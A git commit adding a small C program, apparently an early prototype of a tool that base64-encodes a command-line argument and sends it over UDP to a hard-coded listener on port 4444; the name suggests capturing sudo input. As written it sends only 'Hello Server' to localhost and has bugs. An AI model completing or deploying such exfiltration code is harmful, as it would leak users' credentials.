9806094212b2194e2b43fb79b8fd67d4e3f42499
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-04 14:43:45 -0400

    Add files via upload

---
+++ sudowudo.c
@@ -0,0 +1,101 @@
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <strings.h>
+#include <stdbool.h>
+#include <fcntl.h>
+
+int PORT = 4444;
+char* REMOTE_ADDR = "127.0.0.1";
+#define SIZE 1000
+
+const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+size_t b64_encoded_size(size_t inlen)
+{
+	size_t ret;
+
+	ret = inlen;
+	if (inlen % 3 != 0)
+		ret += 3 - (inlen % 3);
+	ret /= 3;
+	ret *= 4;
+
+	return ret;
+}
+
+char *b64_encode(const unsigned char *in, size_t len)
+{
+	char   *out;
+	size_t  elen;
+	size_t  i;
+	size_t  j;
+	size_t  v;
+
+	if (in == NULL || len == 0)
+		return NULL;
+
+	elen = b64_encoded_size(len);
+	out  = malloc(elen+1);
+	out[elen] = '\0';
+
+	for (i=0, j=0; i<len; i+=3, j+=4) {
+		v = in[i];
+		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
+		v = i+2 < len ? v << 8 | in[i+2] : v << 8;
+
+		out[j]   = b64chars[(v >> 18) & 0x3F];
+		out[j+1] = b64chars[(v >> 12) & 0x3F];
+		if (i+1 < len) {
+			out[j+2] = b64chars[(v >> 6) & 0x3F];
+		} else {
+			out[j+2] = '=';
+		}
+		if (i+2 < len) {
+			out[j+3] = b64chars[v & 0x3F];
+		} else {
+			out[j+3] = '=';
+		}
+	}
+
+	return out;
+}
+
+bool udpSend(const char* msg) {
+    int sockfd;
+    struct sockaddr_in serverAddr;
+    char buffer[1024];
+    socklen_t addr_size;
+
+    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
+    memset(&serverAddr, '\0', sizeof(serverAddr));
+
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PORT);
+    serverAddr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+
+    strcpy(buffer, "Hello Server\n");
+    sendto(sockfd, buffer, 1024, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+    printf("[+]Data Send: %s", buffer);
+    
+    return true;
+}
+
+void main(int argc, char **argv) {
+    if(argc != 2){
+        exit(0);
+    }
+
+    //int len_str = (argv[1]);
+    //printf("%d\n\n", len_str);
+    char* encoded = b64_encode(argv[1], (size_t) 8);
+    printf("%s", encoded);
+
+    udpSend(encoded);
+}
